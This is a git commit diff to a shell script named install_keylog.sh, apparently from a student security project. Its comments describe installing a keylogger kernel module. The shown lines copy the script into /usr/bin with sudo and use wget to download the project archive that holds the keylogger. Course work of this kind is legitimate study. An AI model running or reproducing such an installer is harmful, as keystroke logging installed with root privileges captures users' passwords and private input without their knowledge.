f7d424bd93d6856c5737a9f9d0312e6f39a05a58
DrunkLea <64943211+DrunkLea@users.noreply.github.com>
2020-05-25 23:25:04 +0900

    Update install_keylog.sh

--- Source/install_keylog.sh
+++ Source/install_keylog.sh
@@ -1,6 +1,8 @@
-#!/bin/bash
+# Auto install keylog module in kernel
+# Uninstall "sudo rmmod keylog" not included
+# Need permission before execute: chromd 755 install_keylog.sh
 
-# chromd 755 install_keylog.sh
+#!/bin/bash
 
 sudo cp install_keylog.sh /usr/bin/install_keylog
 wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip
